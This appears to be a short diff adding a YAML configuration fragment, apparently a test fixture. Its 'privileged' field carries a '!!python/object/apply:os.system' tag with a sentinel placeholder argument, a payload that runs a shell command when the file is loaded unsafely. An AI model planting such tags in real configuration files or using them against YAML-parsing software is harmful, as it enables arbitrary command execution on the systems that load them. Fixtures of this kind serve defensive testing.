@@ -1,0 +1,3 @@
+services:
+  admin:
+    privileged: !!python/object/apply:os.system [PRIVATE_SENTINEL_VALUE]
